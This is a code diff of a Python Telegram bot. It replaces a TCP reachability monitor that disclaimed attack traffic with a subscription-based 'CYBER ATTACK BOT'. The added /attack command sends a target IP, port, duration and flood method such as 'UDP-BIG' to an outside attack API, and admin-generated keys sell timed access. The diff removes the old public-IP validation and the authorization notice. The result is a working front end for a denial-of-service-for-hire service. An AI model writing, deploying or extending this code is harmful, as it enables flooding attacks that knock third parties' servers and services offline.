@@ -1,263 +1,684 @@
 import os
-import asyncio
+import json
 import logging
-import ipaddress
-import time
-from datetime import datetime
-from zoneinfo import ZoneInfo
-from threading import Thread
+import random
+import string
+import asyncio
+import threading
+import requests
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from datetime import datetime, timedelta
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-from telegram import Update, BotCommand, ReplyKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes
+# ---------- CONFIGURATION ----------
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN environment variable is not set.")
 
-logging.basicConfig(level=logging.INFO)
-TOKEN = os.environ["TELEGRAM_BOT_TOKEN"]
-MAX_DURATION = 300
-CHECK_INTERVAL = 5
-IST = ZoneInfo("Asia/Kolkata")
-active_checks = {}
-completed_jobs = {}
-
-MENU = ReplyKeyboardMarkup(
-    [["/attack", "/status"], ["/help", "/start"]],
-    resize_keyboard=True,
+BASE_URL = os.environ.get(
+    "BASE_URL",
+    "https://discretion-applicant-gamma-sized.trycloudflare.com/api/attack"
 )
+DEFAULT_METHOD = os.environ.get("DEFAULT_METHOD", "UDP-BIG")
+MAX_DURATION = 300
+COOLDOWN_SECONDS = 3
+ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8508604294"))
+STATUS_UPDATE_INTERVAL = 3
+DATA_FILE = os.environ.get("DATA_FILE", "data.json")
 
+# ---------- GLOBAL STATE ----------
+start_time = datetime.now()
+attack_count = 0
+last_api_response = None
+user_data = {}
+keys = {}
+subscriptions = {}
+
+# ---------- LOGGING ----------
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+
+# ---------- HEALTH / WEB SERVER (for Render) ----------
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        if self.path in ("/", "/health"):
-            body = b"Telegram Bot is running" if self.path == "/" else b"OK"
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain; charset=utf-8")
-            self.send_header("Content-Length", str(len(body)))
-            self.end_headers()
-            self.wfile.write(body)
-        else:
-            body = b"Not Found"
-            self.send_response(404)
-            self.send_header("Content-Type", "text/plain; charset=utf-8")
-            self.send_header("Content-Length", str(len(body)))
-            self.end_headers()
-            self.wfile.write(body)
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain; charset=utf-8")
+        self.send_header("Content-Length", "2")
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+    def do_HEAD(self):
+        self.send_response(200)
+        self.end_headers()
 
     def log_message(self, fmt, *args):
-        logging.info("HTTP health check: " + fmt, *args)
+        return
 
-def run_health_server():
-    port = int(os.environ.get("PORT", "10000"))
-    ThreadingHTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()
 
-def now_ist():
-    return datetime.now(IST)
-
-def fmt_time(ts):
-    return datetime.fromtimestamp(ts, IST).strftime("%H:%M:%S IST")
-
-def valid_public_ip(host):
+def start_web_server():
+    """Start a tiny HTTP server so Render's health check passes."""
+    port = int(os.environ.get("PORT", 8080))
     try:
-        return ipaddress.ip_address(host).is_global
-    except ValueError:
-        return False
+        server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
+    except OSError as e:
+        logger.error(f"Failed to bind health server on port {port}: {e}")
+        return None
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    logger.info(f"Health-check web server listening on 0.0.0.0:{port}")
+    return server
 
-def server_number_for_key(key):
-    # Dashboard slots are display slots, not separate remote servers.
-    # Assign each active monitoring task to the first free display slot.
-    used = {r.get("server") for r in active_checks.values() if r.get("server")}
-    for number in range(1, 6):
-        if number not in used:
-            return number
-    return None
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🟢 TCP Monitor Bot\n\n"
-        "Commands:\n"
-        "/attack <ip> <port> <duration> [DM|GROUP]\n"
-        "/status — refresh the server dashboard\n"
-        "/help — usage\n\n"
-        "This bot checks TCP reachability only. It does not send attack traffic.",
-        reply_markup=MENU,
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "Usage:\n"
-        "/attack 1.1.1.1 443 60\n"
-        "/attack 1.1.1.1 443 60 DM\n\n"
-        "Duration: 1–300 seconds. Checks occur every 5 seconds. "
-        "Only monitor systems you own or are authorized to test.",
-        reply_markup=MENU,
-    )
-
-async def check_port(host, port, timeout=3.0):
-    writer = None
-    try:
-        _, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
-        return True
-    except Exception:
-        return False
-    finally:
-        if writer is not None:
-            writer.close()
-            try:
-                await writer.wait_closed()
-            except Exception:
-                pass
-
-def build_status_text():
-    now = time.time()
-    lines = ["🖥️ SERVER STATUS", ""]
-    by_server = {r["server"]: r for r in active_checks.values() if r.get("server")}
-    for server in range(1, 6):
-        record = by_server.get(server)
-        if record:
-            remaining = max(0, int(record["started"] + record["duration"] - now))
-            lines.extend([
-                f"Server {server}: 🔴 BUSY",
-                f"├── Target: {record['host']}:{record['port']} ({record['label']})",
-                f"└── Time Left: {remaining}s",
-                "",
-            ])
-        else:
-            lines.extend([f"Server {server}: 🟢 FREE", ""])
-    return "\n".join(lines).rstrip()
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(build_status_text(), reply_markup=MENU)
-
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) not in (3, 4):
-        await update.message.reply_text(
-            "Usage: /attack <public-ip> <port> <duration> [DM|GROUP]\n"
-            "Example: /attack 1.1.1.1 443 60 DM",
-            reply_markup=MENU,
-        )
+async def keep_alive_loop():
+    """Ping our own public URL periodically so Render free tier doesn't sleep."""
+    external_url = os.environ.get("RENDER_EXTERNAL_URL")
+    if not external_url:
+        logger.info("RENDER_EXTERNAL_URL not set - keep-alive pings disabled.")
         return
-
-    host, port_s, duration_s = context.args[:3]
-    label = context.args[3].upper() if len(context.args) == 4 else "DM"
-    if label not in ("DM", "GROUP"):
-        await update.message.reply_text("Optional label must be DM or GROUP.")
-        return
-    if not valid_public_ip(host):
-        await update.message.reply_text("Please provide a valid public IP address.")
-        return
-
-    try:
-        port, duration = int(port_s), int(duration_s)
-    except ValueError:
-        await update.message.reply_text("Port and duration must be numbers.")
-        return
-    if not 1 <= port <= 65535:
-        await update.message.reply_text("Port must be 1–65535.")
-        return
-    if not 1 <= duration <= MAX_DURATION:
-        await update.message.reply_text("Duration must be between 1 and 300 seconds.")
-        return
-
-    key = (update.effective_chat.id, host, port)
-    if key in active_checks:
-        await update.message.reply_text("A monitor for this target is already running.")
-        return
-
-    server = server_number_for_key(key)
-    if server is None:
-        await update.message.reply_text("All five monitoring slots are busy. Try again later.")
-        return
-
-    started = time.time()
-    record = {
-        "host": host, "port": port, "duration": duration, "label": label,
-        "started": started, "last_result": "Waiting for first check",
-        "checks": 0, "online": 0, "offline": 0,
-        "chat_id": update.effective_chat.id, "message_id": None, "server": server,
-    }
-    active_checks[key] = record
-
-    start_text = (
-        "💀 MONITOR STARTED 💀\n\n"
-        f"Target: {host}:{port}\n"
-        f"Duration: {duration}s\n"
-        "Method: TCP\n"
-        f"Server: {server}\n\n"
-        f"📅 Started: {fmt_time(started)}\n"
-        f"⏰ Ends: {fmt_time(started + duration)}"
-    )
-    msg = await update.message.reply_text(start_text, reply_markup=MENU)
-    record["message_id"] = msg.message_id
-    asyncio.create_task(run_monitor(key, context.application))
-
-async def run_monitor(key, app):
-    record = active_checks[key]
-    end_at = record["started"] + record["duration"]
-    try:
-        while time.time() < end_at:
-            ok = await check_port(record["host"], record["port"])
-            record["checks"] += 1
-            record["online" if ok else "offline"] += 1
-            record["last_result"] = "🟢 Reachable" if ok else "🔴 Not reachable"
-
-            elapsed = int(time.time() - record["started"])
-            remaining = max(0, int(end_at - time.time()))
-            status_text = (
-                "📊 TCP MONITOR STATUS\n\n"
-                f"Target: {record['host']}:{record['port']}\n"
-                f"State: {record['last_result']}\n"
-                f"Server: {record['server']}\n"
-                f"Elapsed: {elapsed}s / {record['duration']}s\n"
-                f"Remaining: {remaining}s\n"
-                f"Checks: {record['checks']} | Reachable: {record['online']} | Failed: {record['offline']}\n\n"
-                "Refresh interval: 5 seconds"
-            )
-            try:
-                await app.bot.edit_message_text(
-                    chat_id=record["chat_id"], message_id=record["message_id"], text=status_text
-                )
-            except Exception:
-                logging.exception("Could not update monitor message")
-
-            sleep_for = min(CHECK_INTERVAL, max(0, end_at - time.time()))
-            if sleep_for:
-                await asyncio.sleep(sleep_for)
-
-        completed = time.time()
-        completion_text = (
-            "✅ MONITOR COMPLETE ✅\n\n"
-            f"Target: {record['host']}:{record['port']}\n"
-            f"Duration: {record['duration']}s\n"
-            "Method: TCP\n"
-            f"Server: {record['server']}\n\n"
-            f"📅 Started: {fmt_time(record['started'])}\n"
-            f"📅 Completed: {fmt_time(completed)}\n\n"
-            f"Checks: {record['checks']} | Reachable: {record['online']} | Failed: {record['offline']}"
-        )
+    ping_url = external_url.rstrip("/") + "/"
+    while True:
         try:
-            await app.bot.edit_message_text(
-                chat_id=record["chat_id"], message_id=record["message_id"], text=completion_text
+            await asyncio.to_thread(requests.get, ping_url, timeout=15)
+            logger.info(f"Keep-alive ping OK -> {ping_url}")
+        except Exception as e:
+            logger.warning(f"Keep-alive ping failed: {e}")
+        await asyncio.sleep(600)  # every 10 minutes
+
+
+# ---------- DATA PERSISTENCE ----------
+def load_data():
+    global keys, subscriptions
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, 'r') as f:
+                data = json.load(f)
+                keys = data.get("keys", {})
+                subs = data.get("subscriptions", {})
+                subscriptions = {}
+                for uid, ts_str in subs.items():
+                    subscriptions[int(uid)] = datetime.fromisoformat(ts_str)
+                logger.info("Data loaded from file.")
+        except Exception as e:
+            logger.error(f"Error loading data: {e}")
+            keys = {}
+            subscriptions = {}
+    else:
+        keys = {}
+        subscriptions = {}
+
+
+def save_data():
+    try:
+        data = {
+            "keys": keys,
+            "subscriptions": {str(uid): dt.isoformat() for uid, dt in subscriptions.items()}
+        }
+        with open(DATA_FILE, 'w') as f:
+            json.dump(data, f, indent=2)
+        logger.info("Data saved.")
+    except Exception as e:
+        logger.error(f"Error saving data: {e}")
+
+
+# ---------- ACCESS CONTROL ----------
+def is_admin(user_id):
+    return user_id == ADMIN_USER_ID
+
+
+def is_user_active(user_id):
+    if is_admin(user_id):
+        return True
+    if user_id in subscriptions:
+        expiry = subscriptions[user_id]
+        if datetime.now() < expiry:
+            return True
+        else:
+            del subscriptions[user_id]
+            save_data()
+            return False
+    return False
+
+
+def require_active(func):
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
+        user_id = update.effective_user.id
+        if not is_user_active(user_id):
+            await update.message.reply_text(
+                "🔒 Your access has expired. Please contact admin for a new key."
+            )
+            return
+        return await func(update, context, *args, **kwargs)
+    return wrapper
+
+
+# ---------- HELPER FUNCTIONS ----------
+def format_duration(seconds):
+    parts = []
+    days = seconds // 86400
+    if days:
+        parts.append(f"{days}d")
+        seconds %= 86400
+    hours = seconds // 3600
+    if hours:
+        parts.append(f"{hours}h")
+        seconds %= 3600
+    minutes = seconds // 60
+    if minutes:
+        parts.append(f"{minutes}m")
+        seconds %= 60
+    if seconds:
+        parts.append(f"{seconds}s")
+    return " ".join(parts) if parts else "0s"
+
+
+def format_progress_bar(percent):
+    filled = int(percent / 10)
+    filled = min(filled, 10)
+    empty = 10 - filled
+    return "🟩" * filled + "⬜" * empty
+
+
+def format_attack_start(target, port, duration, method):
+    return (
+        f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!\n"
+        f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {target}:{port}\n"
+        f"⏳ 𝗧𝗜𝗠𝗘: {duration}s\n"
+        f"❄️ 𝗦𝗧𝗔𝗥𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: {COOLDOWN_SECONDS}s\n"
+        f"📊 𝙲𝙷𝙴𝙲𝙺 /status 𝙵𝙾𝚁 𝚄𝙿𝙳𝙰𝚃𝙴𝚂"
+    )
+
+
+def format_completion(target, port, duration):
+    return (
+        f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!\n"
+        f"🎯 𝙏𝘼𝙍𝙂𝙀𝙏: {target}:{port}\n"
+        f"⏱️ 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉: {duration}s\n"
+        f"🧊 𝗘𝗡𝗗 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉: {COOLDOWN_SECONDS}s"
+    )
+
+
+def format_status_active(attack_info, user_name):
+    target = attack_info["target"]
+    port = attack_info["port"]
+    duration = attack_info["duration"]
+    start = attack_info["start_time"]
+
+    elapsed = (datetime.now() - start).total_seconds()
+    remaining = max(0, duration - elapsed)
+    percent = min(100, (elapsed / duration) * 100) if duration > 0 else 0
+
+    progress_bar = format_progress_bar(percent)
+
+    lines = [
+        "🟢 𝗦𝗧𝗔𝗧𝗨𝗦",
+        "━━━━━━━━━━━━━━━━━━━━━━━━",
+        f"👤 𝗨𝗦𝗘𝗥: {user_name or 'Hacker'}",
+        f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {target}:{port}",
+        f"⏱️ 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚: {int(remaining)}s / {duration}s • {int(percent)}%",
+        f"📊 [{progress_bar}]",
+        "────────────────────────",
+        "🔴 𝗦𝗟𝗢𝗧𝗦 𝗙𝗨𝗟𝗟: 1/1",
+        "────────────────────────"
+    ]
+    return "\n".join(lines)
+
+
+def format_status_inactive():
+    return "🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘!"
+
+
+# ---------- ASYNC COMPLETION TASK ----------
+async def send_completion_after_delay(user_id, chat_id, attack_info, bot):
+    duration = attack_info["duration"]
+    logger.info(f"Completion task started for user {user_id}, sleeping {duration}s")
+    await asyncio.sleep(duration)
+
+    if user_id in user_data and user_data[user_id].get("active"):
+        current = user_data[user_id]["active"]
+        if current["start_time"] == attack_info["start_time"] and not user_data[user_id].get("completion_sent", False):
+            try:
+                completion_msg = format_completion(
+                    attack_info["target"],
+                    attack_info["port"],
+                    attack_info["duration"]
+                )
+                await bot.send_message(chat_id=chat_id, text=completion_msg)
+                logger.info(f"Completion message sent to {chat_id} via async task")
+                user_data[user_id]["completion_sent"] = True
+                user_data[user_id]["active"] = None
+                user_data[user_id]["last_finish_time"] = datetime.now()
+                if user_data[user_id].get("status_job"):
+                    user_data[user_id]["status_job"].schedule_removal()
+                    user_data[user_id]["status_job"] = None
+            except Exception as e:
+                logger.error(f"Failed to send completion message via async task: {e}")
+
+
+# ---------- STATUS UPDATE JOB ----------
+async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
+    job = context.job
+    user_id = job.user_id
+    chat_id = job.chat_id
+    message_id = job.data["message_id"]
+
+    if user_id not in user_data or not user_data[user_id].get("active"):
+        try:
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text="✅ Your attack has finished."
             )
         except Exception:
-            logging.exception("Could not update completion message")
-        completed_jobs[key] = {**record, "completed": completed}
-    finally:
-        active_checks.pop(key, None)
+            pass
+        job.schedule_removal()
+        return
 
-async def post_init(app: Application):
-    await app.bot.set_my_commands([
-        BotCommand("start", "Show main menu"),
-        BotCommand("attack", "Start a TCP reachability monitor"),
-        BotCommand("status", "Show ongoing monitoring jobs"),
-        BotCommand("help", "Show usage"),
-    ])
+    attack = user_data[user_id]["active"]
+    now = datetime.now()
+    elapsed = (now - attack["start_time"]).total_seconds()
+    remaining = max(0, attack["duration"] - elapsed)
+
+    if remaining <= 0:
+        user_data[user_id]["active"] = None
+        user_data[user_id]["last_finish_time"] = now
+        if user_data[user_id].get("status_job"):
+            user_data[user_id]["status_job"] = None
+        try:
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text="✅ Your attack has finished."
+            )
+        except Exception:
+            pass
+        job.schedule_removal()
+        return
+
+    user_name = job.data.get("user_name", "Hacker")
+    status_text = format_status_active(attack, user_name)
+    try:
+        await context.bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=status_text
+        )
+    except Exception as e:
+        logger.error(f"Failed to edit status message: {e}")
+        job.schedule_removal()
+
+
+# ---------- COMMAND HANDLERS ----------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if is_admin(user_id):
+        await update.message.reply_text(
+            "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔓 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 – Permanent Access\n\n"
+            "▸ ⚙️ /genkey <seconds>   – Generate a key\n"
+            "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
+            "▸ 📊 /status             – Live attack progress\n"
+            "▸ 📖 /help               – Show this menu\n\n"
+            "💡 Example: /attack 192.168.1.1 80 60\n"
+            "🔒 All attacks are logged."
+        )
+    else:
+        if is_user_active(user_id):
+            await update.message.reply_text(
+                "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "🔓 𝗨𝘀𝗲𝗿 𝗔𝗰𝗰𝗲𝘀𝘀 – Active Subscription\n\n"
+                "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
+                "▸ 📊 /status             – Live attack progress\n"
+                "▸ 🔑 /redeem <key>       – Activate a new key\n"
+                "▸ 📖 /help               – Show this menu\n\n"
+                "💡 Example: /attack 192.168.1.1 80 60\n"
+                "⚠️ Max attack duration: 300s"
+            )
+        else:
+            await update.message.reply_text(
+                "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "🔒 𝗔𝗰𝗰𝗲𝘀𝘀 𝗟𝗼𝗰𝗸𝗲𝗱 – No Active Subscription\n\n"
+                "To gain access, redeem a key:\n"
+                "🔑 /redeem <key>\n\n"
+                "📨 Contact the admin if you need a key."
+            )
+
+
+async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if is_admin(user_id):
+        await update.message.reply_text(
+            "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📖 𝗔𝗱𝗺𝗶𝗻 𝗛𝗲𝗹𝗽\n\n"
+            "▸ ⚙️ /genkey <seconds>   – Generate a key\n"
+            "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
+            "▸ 📊 /status             – Live attack progress\n"
+            "▸ 📖 /help               – Show this menu\n\n"
+            "💡 Example: /attack 192.168.1.1 80 60"
+        )
+    else:
+        if is_user_active(user_id):
+            await update.message.reply_text(
+                "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "📖 𝗨𝘀𝗲𝗿 𝗛𝗲𝗹𝗽\n\n"
+                "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
+                "▸ 📊 /status             – Live attack progress\n"
+                "▸ 🔑 /redeem <key>       – Activate a new key\n"
+                "▸ 📖 /help               – Show this menu\n\n"
+                "💡 Example: /attack 192.168.1.1 80 60\n"
+                "⚠️ Max attack duration: 300s"
+            )
+        else:
+            await update.message.reply_text(
+                "🔒 You don't have an active subscription.\n"
+                "Use /redeem <key> to activate access."
+            )
+
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if is_admin(user_id):
+        await update.message.reply_text("ℹ️ Admin already has permanent access. No need to redeem.")
+        return
+
+    if is_user_active(user_id):
+        await update.message.reply_text(
+            "✅ You already have an active subscription. No need to redeem another key."
+        )
+        return
+
+    args = context.args
+    if len(args) != 1:
+        await update.message.reply_text(
+            "❌ Invalid format.\nUsage: /redeem <key>"
+        )
+        return
+
+    key = args[0]
+    if key not in keys:
+        await update.message.reply_text(
+            "❌ Invalid key. Please check and try again."
+        )
+        return
+
+    key_data = keys[key]
+    if key_data["used_by"] is not None:
+        await update.message.reply_text(
+            "❌ This key has already been used."
+        )
+        return
+
+    duration = key_data["duration"]
+    expiry = datetime.now() + timedelta(seconds=duration)
+
+    keys[key]["used_by"] = user_id
+    subscriptions[user_id] = expiry
+    save_data()
+
+    await update.message.reply_text(
+        f"✅ Key redeemed successfully!\n"
+        f"⏱️ Access granted for {format_duration(duration)} (until {expiry.strftime('%Y-%m-%d %H:%M:%S')}).\n"
+        f"🔓 Enjoy the bot!"
+    )
+
+
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        await update.message.reply_text("⛔ Admin only command.")
+        return
+
+    args = context.args
+    if len(args) != 1:
+        await update.message.reply_text(
+            "❌ Invalid format.\nUsage: /genkey <seconds>\n"
+            "Example: /genkey 3600  (for 1 hour)"
+        )
+        return
+
+    try:
+        duration = int(args[0])
+        if duration <= 0:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ Duration must be a positive integer (seconds).")
+        return
+
+    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+
+    keys[key] = {
+        "duration": duration,
+        "used_by": None
+    }
+    save_data()
+
+    duration_str = format_duration(duration)
+    await update.message.reply_text(
+        f"✅ Key generated successfully!\n"
+        f"🔑 Key: `{key}`\n"
+        f"⏱️ Duration: {duration_str}\n"
+        f"🔓 Usage: /redeem {key}"
+    )
+
+
+@require_active
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global attack_count, last_api_response
+
+    user_id = update.effective_user.id
+
+    if user_id not in user_data:
+        user_data[user_id] = {
+            "last_finish_time": None,
+            "active": None,
+            "status_job": None,
+            "completion_task": None,
+            "completion_sent": False
+        }
+
+    if user_data[user_id].get("completion_task"):
+        user_data[user_id]["completion_task"].cancel()
+        user_data[user_id]["completion_task"] = None
+
+    if user_data[user_id]["active"]:
+        user_data[user_id]["active"] = None
+        if user_data[user_id].get("status_job"):
+            user_data[user_id]["status_job"].schedule_removal()
+            user_data[user_id]["status_job"] = None
+
+    last_finish = user_data[user_id]["last_finish_time"]
+    if last_finish:
+        elapsed_since_finish = (datetime.now() - last_finish).total_seconds()
+        if elapsed_since_finish < COOLDOWN_SECONDS:
+            wait = int(COOLDOWN_SECONDS - elapsed_since_finish) + 1
+            await update.message.reply_text(
+                f"⏳ Please wait {wait} seconds after your last attack finished."
+            )
+            return
+
+    args = context.args
+    if len(args) < 3:
+        await update.message.reply_text(
+            "☣️  Usage: /attack <ip> <port> <duration>"
+        )
+        return
+
+    target = args[0]
+    port = args[1]
+    duration = args[2]
+    method = args[3] if len(args) > 3 else DEFAULT_METHOD
+
+    try:
+        port = int(port)
+        if not (1 <= port <= 65535):
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ Port must be a number between 1 and 65535.")
+        return
+
+    try:
+        duration = int(duration)
+        if duration <= 0:
+            raise ValueError
+        if duration > MAX_DURATION:
+            await update.message.reply_text(f"❌ Max duration is {MAX_DURATION} seconds.")
+            return
+    except ValueError:
+        await update.message.reply_text("❌ Duration must be a positive integer (seconds).")
+        return
+
+    # API request: only host, port, time, method (no API key)
+    params = {
+        "host": target,
+        "port": port,
+        "time": duration,
+        "method": method
+    }
+
+    try:
+        response = await asyncio.to_thread(
+            requests.get, BASE_URL, params=params, timeout=30
+        )
+        response.raise_for_status()
+
+        try:
+            data = response.json()
+        except ValueError:
+            data = {}
+
+        # Only treat an explicit success=false as failure
+        if isinstance(data, dict) and data.get("success") is False:
+            error_msg = data.get("message", "Unknown error")
+            await update.message.reply_text(f"❌ Attack failed: {error_msg}")
+            return
+
+        attack_count += 1
+        last_api_response = response.text
+
+        now = datetime.now()
+        attack_info = {
+            "target": target,
+            "port": port,
+            "duration": duration,
+            "method": method,
+            "start_time": now
+        }
+        user_data[user_id]["last_finish_time"] = None
+        user_data[user_id]["active"] = attack_info
+        user_data[user_id]["completion_sent"] = False
+
+        bot = context.bot
+        task = asyncio.create_task(
+            send_completion_after_delay(user_id, update.effective_chat.id, attack_info, bot)
+        )
+        user_data[user_id]["completion_task"] = task
+        logger.info(f"Async completion task scheduled for user {user_id} in {duration}s")
+
+        launch_msg = format_attack_start(target, port, duration, method)
+        await update.message.reply_text(launch_msg)
+
+    except requests.exceptions.RequestException as e:
+        logger.error(f"Request failed: {e}")
+        await update.message.reply_text(f"❌ Attack failed: {e}")
+
+
+@require_active
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    try:
+        if user_id in user_data and user_data[user_id].get("active"):
+            attack = user_data[user_id]["active"]
+            elapsed = (datetime.now() - attack["start_time"]).total_seconds()
+            if elapsed >= attack["duration"]:
+                if not user_data[user_id].get("completion_sent", False):
+                    completion_msg = format_completion(attack["target"], attack["port"], attack["duration"])
+                    await update.message.reply_text(completion_msg)
+                    user_data[user_id]["completion_sent"] = True
+                user_data[user_id]["active"] = None
+                user_data[user_id]["last_finish_time"] = datetime.now()
+                if user_data[user_id].get("status_job"):
+                    user_data[user_id]["status_job"].schedule_removal()
+                    user_data[user_id]["status_job"] = None
+                await update.message.reply_text(format_status_inactive())
+                return
+
+        if user_id not in user_data or not user_data[user_id].get("active"):
+            await update.message.reply_text(format_status_inactive())
+            return
+
+        old_job = user_data[user_id].get("status_job")
+        if old_job:
+            old_job.schedule_removal()
+            user_data[user_id]["status_job"] = None
+
+        attack = user_data[user_id]["active"]
+        user_name = update.effective_user.first_name or "Hacker"
+        status_text = format_status_active(attack, user_name)
+        sent_msg = await update.message.reply_text(status_text)
+
+        job_queue = context.job_queue or context.application.job_queue
+        if job_queue:
+            job_data = {
+                "message_id": sent_msg.message_id,
+                "user_name": user_name,
+                "chat_id": update.effective_chat.id
+            }
+            job = job_queue.run_repeating(
+                update_status_message,
+                interval=STATUS_UPDATE_INTERVAL,
+                first=STATUS_UPDATE_INTERVAL,
+                user_id=user_id,
+                chat_id=update.effective_chat.id,
+                data=job_data
+            )
+            user_data[user_id]["status_job"] = job
+        else:
+            logger.error("JobQueue not available for /status")
+
+    except Exception as e:
+        logger.error(f"Error in /status: {e}")
+        await update.message.reply_text("❌ An error occurred while fetching status. Please try again.")
+
+
+# ---------- MAIN ----------
+async def post_init(application):
+    """Runs after the application is initialized (inside the running loop)."""
+    asyncio.create_task(keep_alive_loop())
+
 
 def main():
-    Thread(target=run_health_server, daemon=True).start()
-    app = Application.builder().token(TOKEN).post_init(post_init).build()
+    load_data()
+
+    # Start the Render health-check web server before the bot starts polling.
+    start_web_server()
+
+    app = (
+        ApplicationBuilder()
+        .token(BOT_TOKEN)
+        .post_init(post_init)
+        .build()
+    )
+
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("attack", attack_command))
-    app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("help", help))
+    app.add_handler(CommandHandler("redeem", redeem))
+    app.add_handler(CommandHandler("genkey", genkey))
+    app.add_handler(CommandHandler("attack", attack))
+    app.add_handler(CommandHandler("status", status))
+
+    logger.info("Bot started polling...")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
